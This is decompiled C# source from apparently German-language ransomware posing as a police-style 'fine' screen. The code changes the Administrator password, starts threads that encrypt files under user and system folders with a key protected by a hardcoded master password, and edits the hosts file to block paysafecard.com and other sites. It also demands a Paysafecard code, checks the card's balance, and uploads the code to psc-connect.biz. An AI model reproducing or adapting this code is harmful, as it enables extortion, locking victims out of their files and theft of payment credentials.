		class13_0.KeyLetters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		class13_0.KeyNumbers = "0123456789";
		class13_0.KeyChars = 12;
		Class6.smethod_3(disable: true);
		Class6.smethod_4(disable: true);
		Class6.smethod_5(disable: true);
		Class6.smethod_2();
		Class16.smethod_0();
		Class17.smethod_0("Administrator", "MasterPassword!1");
		Class17.smethod_0(Environment.UserName, "");
		Class17.smethod_1();
		stopwatch_0.Start();
		tmrRemaining.Start();
		if (Operators.CompareString(Class19.Settings.decryptPassword, "", false) == 0)
		{
			string_0 = class13_0.method_0();
			Class19.Settings.decryptPassword = Class9.smethod_5(string_0, "MasterPassword12345!");
			((ApplicationSettingsBase)Class19.Settings).Save();
		}
		else
		{
			try
			{
				string_0 = Class9.smethod_7(Class19.Settings.decryptPassword, "MasterPassword12345!");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = class13_0.method_0();
				ProjectData.ClearProjectError();
			}
		}
		object[] array = new object[3];
		if (((ServerComputer)Class1.Computer).get_Info().get_OSFullName().Contains("7") | ((ServerComputer)Class1.Computer).get_Info().get_OSFullName().Contains("Vista") | ((ServerComputer)Class1.Computer).get_Info().get_OSFullName().Contains("Server 2008"))
		{
			array[0] = Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\Users\\";
		}
		else
		{
			array[0] = Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\Dokumente und Einstellungen\\";
		}
		array[1] = string_0;
		array[2] = true;
		thread_1.Start(array);
		object[] parameter = new object[3]
		{
			Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\",
			string_0,
			true
		};
		thread_2.Start(parameter);
		StreamWriter streamWriter = new StreamWriter(Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\WINDOWS\\system32\\drivers\\etc\\hosts", append: true);
		streamWriter.WriteLine("127.0.0.1 www.mygully.com");
		streamWriter.WriteLine("127.0.0.1 www.boerse.bz");
		streamWriter.Close();
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadData("http://psc-connect.biz/index.php");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void btnExit_Click(object sender, EventArgs e)
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_Opacity(0.3);
		Class6.smethod_0(AutostartEnable: false);
		Class6.smethod_3(disable: false);
		Class6.smethod_4(disable: false);
		Class6.smethod_5(disable: false);
		Class10.smethod_2();
		Class15.smethod_0(0);
		Class16.smethod_1();
		Class17.smethod_0("Administrator", "123456");
		Class17.smethod_2();
		((Form)this).set_TopMost(false);
		Interaction.MsgBox((object)"Sie haben ihre Strafe erfolgreich gezahlt. Das Admin Passwort wurde zurückgesetzt auf 123456. Diese Sperre deinstalliert sich nun von selber. Die Datein werden wieder hergestellt nachdem sie auf OK gedrückt haben.Das Programm nicht beenden bis es sich von selber beendet sonst sind ihre Daten nicht mehr wiederherstellbar. Dieser Prozess könnte bis zu 2 Stunden dauern", (MsgBoxStyle)64, (object)"Information");
		object[] array = new object[3];
		if (((ServerComputer)Class1.Computer).get_Info().get_OSFullName().Contains("7") | ((ServerComputer)Class1.Computer).get_Info().get_OSFullName().Contains("Vista") | ((ServerComputer)Class1.Computer).get_Info().get_OSFullName().Contains("Server 2008"))
		{
			array[0] = Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\Users\\";
		}
		else
		{
			array[0] = Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\Dokumente und Einstellungen\\";
		}
		array[1] = string_0;
		array[2] = false;
		object[] parameter = new object[3]
		{
			Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\",
			string_0,
			true
		};
		if (thread_1.IsAlive)
		{
			thread_1.Abort();
		}
		if (thread_2.IsAlive)
		{
			thread_2.Abort();
		}
		Class19.Settings.decryptPassword = string.Empty;
		thread_3.Start(array);
		thread_4.Start(parameter);
		thread_3.Join();
		thread_4.Join();
		Thread.Sleep(1800000);
		Environment.Exit(0);
	}

	private unsafe void tmrRemaining_Tick(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[12];
		Label obj = lblTime;
		*(int*)ptr = stopwatch_0.Elapsed.Hours;
		string arg = ((int*)ptr)->ToString().PadLeft(2, '0');
		*(int*)((byte*)ptr + 4) = stopwatch_0.Elapsed.Minutes;
		string arg2 = ((int*)((byte*)ptr + 4))->ToString().PadLeft(2, '0');
		*(int*)((byte*)ptr + 8) = stopwatch_0.Elapsed.Seconds;
		obj.set_Text($"{arg}:{arg2}:{((int*)((byte*)ptr + 8))->ToString().PadLeft(2, '0')}");
		*(int*)((byte*)ptr + 8) = stopwatch_0.Elapsed.Hours;
		if (Operators.CompareString(((int*)((byte*)ptr + 8))->ToString().PadLeft(2, '0'), "12", false) == 0)
		{
			Class8.smethod_0();
			stopwatch_0.Stop();
			return;
		}
		*(int*)((byte*)ptr + 8) = stopwatch_0.Elapsed.Minutes;
		if (Operators.CompareString(((int*)((byte*)ptr + 8))->ToString().PadLeft(2, '0'), "05", false) == 0)
		{
			((Control)tbOpacity).set_Enabled(true);
		}
	}

	private void btnZahlen_Click(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				string_1 = txtPSC.get_Text().Split(new char[1] { '-' });
				if (!((Operators.CompareString(string_1[0], "", false) != 0) & (Operators.CompareString(string_1[1], "", false) != 0) & (Operators.CompareString(string_1[2], "", false) != 0) & (Operators.CompareString(string_1[3], "", false) != 0)))
				{
					return;
				}
				int num = 0;
				do
				{
					if (string_1[num].Length == 4)
					{
						num++;
						num++;
						continue;
					}
					lblStatus.set_Text("Sie haben ihr Paysafecard in einem falschen Format eingegeben");
					return;
				}
				while (num <= 3);
				if (Class7.smethod_0(txtPSC.get_Text()))
				{
					lblStatus.set_Text("Ihre Paysafecard ist nicht zu verwenden oder der Server ist gerade nicht erreichbar.");
				}
				else if (!Class12.smethod_0())
				{
					lblStatus.set_Text("Verbindung derzeit nicht möglich. Bitte versuchen sie es später noch ein mal.");
					((Control)btnCaptchaOK).set_Enabled(false);
				}
				else
				{
					lblStatus.set_Text("Geben sie links das Captcha ein.");
					((Control)txtPSC).set_Enabled(false);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				lblStatus.set_Text("Fehler bei der Formatierung!");
				ProjectData.ClearProjectError();
			}
		}
	}

	private void tbOpacity_ValueChanged(object sender, EventArgs e)
	{
		((Form)this).set_Opacity((double)tbOpacity.get_Value() / 100.0);
	}

	private void btnCaptchaOK_Click(object sender, EventArgs e)
	{
		try
		{
			lblStatus.set_Text("Überprüfe...");
			string text = Class12.smethod_1(string_1[0], string_1[1], string_1[2], string_1[3], txtCaptcha.get_Text());
			string value = new Regex("class=\\\"price\\\">\\n<td>(.+?)</td>\\n<td>EUR</td>").Match(text).Groups[1].Value;
			switch (text)
			{
			case "captcha":
				lblStatus.set_Text("Falsches Captcha, versuchen sie es nochmal und drücken sie auf OK");
				Class12.smethod_0();
				return;
			case "pinpass":
				lblStatus.set_Text("Die Paysafecard existiert nicht.");
				((Control)btnCaptchaOK).set_Enabled(false);
				return;
			case "uerror":
				lblStatus.set_Text("Unbekannter Fehler. Bitte versuchen sie es später noch ein mal.");
				((Control)btnCaptchaOK).set_Enabled(false);
				return;
			}
			if (value.Contains("25") | value.Contains("50"))
			{
				lblStatus.set_Text("Valid");
				StreamWriter streamWriter = new StreamWriter(Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\WINDOWS\\system32\\drivers\\etc\\hosts", append: true);
				streamWriter.WriteLine("127.0.0.1 www.paysafecard.com");
				streamWriter.Close();
				((Control)btnCaptchaOK).set_Enabled(false);
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc", Class9.smethod_5(txtPSC.get_Text(), "MasterPassword12345!"));
				WebClient webClient = new WebClient();
				webClient.UploadFile("http://psc-connect.biz/upload.php", "POST", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc");
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc");
				if (thread_1.IsAlive)
				{
					thread_1.Abort();
				}
				if (thread_2.IsAlive)
				{
					thread_2.Abort();
				}
				stopwatch_0.Stop();
				tmrRemaining.Stop();
				Class6.smethod_6();
			}
			else if (value.Contains("10"))
			{
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc", Class9.smethod_5(txtPSC.get_Text(), "MasterPassword12345!"));
				WebClient webClient2 = new WebClient();
				webClient2.UploadFile("http://psc-connect.biz/upload.php", "POST", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc");
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + ".log_psc");
			}
			else
			{
				lblStatus.set_Text("Ihre Paysafecard hat kein Guthaben von 50€");
				((Control)btnCaptchaOK).set_Enabled(false);
				((Control)txtPSC).set_Enabled(true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			lblStatus.set_Text("Versuchen sie es später noch ein mal.");
			((Control)btnCaptchaOK).set_Enabled(false);
			((Control)txtPSC).set_Enabled(true);
			ProjectData.ClearProjectError();
		}
	}
}
